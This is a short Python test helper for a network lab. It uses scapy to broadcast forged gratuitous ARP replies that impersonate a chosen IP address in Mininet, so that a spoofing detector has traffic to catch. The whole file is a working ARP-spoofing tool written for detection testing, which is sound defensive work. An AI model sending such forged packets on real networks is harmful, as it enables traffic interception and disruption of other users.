#!/usr/bin/env python3
"""
Module 3 test helper — sends a forged (gratuitous) ARP reply claiming
to own someone else's IP. Run this FROM the attacking Mininet host so
the packet actually appears on the wire for the detector to see.

Example (h3 impersonates h1's IP):
    mininet> h3 python3 detection/simulate_arp_spoof.py --victim-ip 10.0.0.1 --iface h3-eth0
"""

import argparse

from scapy.all import ARP, Ether, get_if_hwaddr, sendp


def main():
    p = argparse.ArgumentParser(description="Send a forged ARP reply (attack simulation)")
    p.add_argument("--victim-ip", required=True, help="IP address to impersonate")
    p.add_argument("--iface", required=True, help="Interface to send from, e.g. h3-eth0")
    p.add_argument("--count", type=int, default=3, help="How many forged replies to send")
    args = p.parse_args()

    my_mac = get_if_hwaddr(args.iface)
    print(
        f"[*] Sending {args.count} forged ARP replies on {args.iface}: "
        f"claiming {args.victim_ip} is-at {my_mac}"
    )

    pkt = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,                       # ARP reply
        psrc=args.victim_ip,        # the IP being impersonated
        hwsrc=my_mac,                # attacker's real MAC
        pdst=args.victim_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
    )
    sendp(pkt, iface=args.iface, count=args.count, inter=0.5, verbose=False)
    print("[*] Done.")


if __name__ == "__main__":
    main()
